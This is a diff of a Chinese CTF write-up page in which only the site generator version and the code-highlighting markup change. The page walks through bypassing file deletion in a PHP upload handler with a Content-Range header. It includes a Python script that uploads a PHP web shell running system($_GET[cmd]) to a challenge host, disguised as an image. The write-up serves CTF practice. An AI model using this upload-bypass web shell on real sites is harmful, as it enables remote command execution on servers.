@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -290,28 +290,28 @@
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">function</span> <span class="nf">get_upload_data</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nv">$id</span><span class="p">];</span>
-<span class="p">}</span>
-<span class="c1">// 
-</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nv">$uploaded_file</span> <span class="o">&amp;&amp;</span> <span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$content_range</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$append_file</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">file_put_contents</span><span class="p">(</span>
-            <span class="nv">$file_path</span><span class="p">,</span>
-            <span class="nx">fopen</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">),</span>
-            <span class="nx">FILE_APPEND</span>
-        <span class="p">);</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">,</span> <span class="nv">$file_path</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="nx">file_put_contents</span><span class="p">(</span>
-        <span class="nv">$file_path</span><span class="p">,</span>
-        <span class="nx">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;input_stream&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">),</span>
-        <span class="nv">$append_file</span> <span class="o">?</span> <span class="nx">FILE_APPEND</span> <span class="o">:</span> <span class="mi">0</span>
-    <span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">get_upload_data</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nv">$id</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nv">$uploaded_file</span> <span class="o">&amp;&amp;</span> <span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$content_range</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$append_file</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$file_path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">fopen</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">FILE_APPEND</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">,</span> <span class="nv">$file_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$file_path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;input_stream&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$append_file</span> <span class="o">?</span> <span class="nx">FILE_APPEND</span> <span class="o">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><code>处理上传文件(upload.php: 1024行)</code></p>
 <div class="highlight"><div class="chroma">
@@ -335,24 +335,24 @@
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="nv">$uploaded_file</span> <span class="o">&amp;&amp;</span> <span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$content_range</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$append_file</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">file_put_contents</span><span class="p">(</span>
-            <span class="nv">$file_path</span><span class="p">,</span>
-            <span class="nx">fopen</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">),</span>
-            <span class="nx">FILE_APPEND</span>
-        <span class="p">);</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">,</span> <span class="nv">$file_path</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="nx">file_put_contents</span><span class="p">(</span>
-        <span class="nv">$file_path</span><span class="p">,</span>
-        <span class="nx">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;input_stream&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">),</span>
-        <span class="nv">$append_file</span> <span class="o">?</span> <span class="nx">FILE_APPEND</span> <span class="o">:</span> <span class="mi">0</span>
-    <span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$uploaded_file</span> <span class="o">&amp;&amp;</span> <span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$content_range</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$append_file</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$file_path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">fopen</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">FILE_APPEND</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$uploaded_file</span><span class="p">,</span> <span class="nv">$file_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$file_path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;input_stream&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$append_file</span> <span class="o">?</span> <span class="nx">FILE_APPEND</span> <span class="o">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>除了处理上传的函数，还定义了读文件函数(<code>upload.php: 1066行</code>)，可能存在任意文件读取，等需要用到的时候再说（事实证明没用到</p>
 <p>很明显，<code>get_upload_data</code>函数就是负责传回上传文件的信息数组，那我们先本地传文件尝试一下，将index.php修改为(其他方法也行)</p>
@@ -380,27 +380,27 @@
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">html</span><span class="o">&gt;</span>
-<span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
-<span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
-	<span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">upload</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
-<span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
-<span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
-<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&#34;index.php&#34;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&#34;post&#34;</span> <span class="nx">enctype</span><span class="o">=</span><span class="s2">&#34;multipart/form-data&#34;</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="s2">&#34;file&#34;</span><span class="o">&gt;</span><span class="nx">文件名：</span><span class="o">&lt;/</span><span class="nx">label</span><span class="o">&gt;</span>
-    <span class="o">&lt;!--</span> <span class="nx">name设置为数组格式，通过1288行</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$upload</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])</span> <span class="nx">的判断</span> <span class="o">--&gt;</span>
-    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;file&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;files[]&#34;</span> <span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;提交&#34;</span><span class="o">&gt;</span>
-<span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
-<span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>
-<span class="o">&lt;?</span><span class="nx">php</span>
-    <span class="k">require</span><span class="p">(</span><span class="s1">&#39;upload.php&#39;</span><span class="p">);</span>
-    <span class="nv">$upload_handler</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">UploadHandler</span><span class="p">();</span>
-<span class="cp">?&gt;</span><span class="err">
-</span><span class="err">&lt;/p&gt;
-</span><span class="err">&lt;/body&gt;
-</span><span class="err">&lt;/html&gt;
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">upload</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&#34;index.php&#34;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&#34;post&#34;</span> <span class="nx">enctype</span><span class="o">=</span><span class="s2">&#34;multipart/form-data&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="s2">&#34;file&#34;</span><span class="o">&gt;</span><span class="nx">文件名：</span><span class="o">&lt;/</span><span class="nx">label</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;!--</span> <span class="nx">name设置为数组格式，通过1288行</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$upload</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])</span> <span class="nx">的判断</span> <span class="o">--&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;file&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;files[]&#34;</span> <span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;提交&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="k">require</span><span class="p">(</span><span class="s1">&#39;upload.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$upload_handler</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">UploadHandler</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>上传过程倒是很顺利，但是files目录为什么没有上传的文件呢？</p>
 <p>将目光聚焦于1056行的代码</p>
@@ -412,11 +412,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$content_range</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;discard_aborted_uploads&#39;</span><span class="p">])</span> <span class="p">{</span>
-    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">);</span>
-    <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">error</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_error_message</span><span class="p">(</span><span class="s1">&#39;abort&#39;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$content_range</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;discard_aborted_uploads&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">error</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_error_message</span><span class="p">(</span><span class="s1">&#39;abort&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>可以看到这里使用了unlink函数删除上传的文件，如果我们不想它执行的话肯定是要跳过这个条件判断，即让<code>$content_range</code>有值。</p>
 <p>那这个变量是什么呢？跳到1281行</p>
@@ -427,10 +427,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$content_range_header</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_server_var</span><span class="p">(</span><span class="s1">&#39;HTTP_CONTENT_RANGE&#39;</span><span class="p">);</span> <span class="c1">// $_SERVER[&#39;HTTP_CONTENT_RANGE&#39;]
-</span><span class="c1"></span><span class="nv">$content_range</span> <span class="o">=</span> <span class="nv">$content_range_header</span> <span class="o">?</span>
-    <span class="nx">preg_split</span><span class="p">(</span><span class="s1">&#39;/[^0-9]+/&#39;</span><span class="p">,</span> <span class="nv">$content_range_header</span><span class="p">)</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$content_range_header</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_server_var</span><span class="p">(</span><span class="s1">&#39;HTTP_CONTENT_RANGE&#39;</span><span class="p">);</span> <span class="c1">// $_SERVER[&#39;HTTP_CONTENT_RANGE&#39;]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$content_range</span> <span class="o">=</span> <span class="nv">$content_range_header</span> <span class="o">?</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">preg_split</span><span class="p">(</span><span class="s1">&#39;/[^0-9]+/&#39;</span><span class="p">,</span> <span class="nv">$content_range_header</span><span class="p">)</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><code>$content_range</code>的值来自<code>$_SERVER['HTTP_CONTENT_RANGE']</code>中有数字的内容，那这玩意又是什么呢？可以看<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Range" target="_blank" rel="noopener">Content-Range</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Range_requests" target="_blank" rel="noopener">HTTP请求范围</a>两篇文章了解（解释不了</p>
 <p>简单来说就是在header添加一个<code>Content-Range</code>设置一下请求范围，抓包添加传文件，啪的一下很快啊，文件就成功上传了，而且还是直接传的php哟😎</p>
@@ -445,13 +445,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">io</span>
-<span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;http://d33bd228-368f-4581-93d1-9d54451a30bf.node3.buuoj.cn/&#34;</span>
-<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;Content-Range&#34;</span><span class="p">:</span> <span class="s2">&#34;bytes 0-1023/1070&#34;</span> <span class="p">}</span>
-<span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;files[]&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;tyskill.php&#34;</span><span class="p">,</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&lt;?php echo(&#39;PWN!!&#39;);system($_GET[cmd]);?&gt;&#34;</span><span class="p">),</span> <span class="s2">&#34;image/png&#34;</span><span class="p">)}</span>
-<span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;http://d33bd228-368f-4581-93d1-9d54451a30bf.node3.buuoj.cn/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;Content-Range&#34;</span><span class="p">:</span> <span class="s2">&#34;bytes 0-1023/1070&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;files[]&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;tyskill.php&#34;</span><span class="p">,</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&lt;?php echo(&#39;PWN!!&#39;);system($_GET[cmd]);?&gt;&#34;</span><span class="p">),</span> <span class="s2">&#34;image/png&#34;</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="easyphpunsolve"><a href="#easyphpunsolve" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:easyphpunsolve" class="headings">easyphp|unsolve</a></h2>
 <p>下源码发现是laravel框架，版本号是7.30.0，但是关键的<code>.env</code>文件没有给，且config目录里给的信息也不太全，搭环境的成本太大了，还是硬上吧。</p>
@@ -462,8 +462,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;check/{id}&#39;</span><span class="p">,</span><span class="s1">&#39;CheckController@index&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="s1">&#39;[0-9]+&#39;</span><span class="p">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;check/{id}&#39;</span><span class="p">,</span><span class="s1">&#39;CheckController@index&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="s1">&#39;[0-9]+&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><code>routes/web.php</code></p>
 <div class="highlight"><div class="chroma">
@@ -473,10 +473,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@index&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;/sendmessage/{postid}&#39;</span><span class="p">,</span><span class="s1">&#39;HomeController@sendme&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;postid&#39;</span><span class="p">,</span> <span class="s1">&#39;[0-9]+&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/viewed/{id}&#39;</span><span class="p">,</span><span class="s1">&#39;HomeController@viewed&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span><span class="s1">&#39;[0-9]+&#39;</span><span class="p">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@index&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Route</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;/sendmessage/{postid}&#39;</span><span class="p">,</span><span class="s1">&#39;HomeController@sendme&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;postid&#39;</span><span class="p">,</span> <span class="s1">&#39;[0-9]+&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/viewed/{id}&#39;</span><span class="p">,</span><span class="s1">&#39;HomeController@viewed&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span><span class="s1">&#39;[0-9]+&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>api先不管，<code>web.php</code>三个路由都用到了控制器<strong>HomeController</strong>，去<code>app/Http/Controllers/HomeController.php</code>看看</p>
 <div class="highlight"><div class="chroma">
@@ -526,50 +526,50 @@
 </span><span class="lnt">43
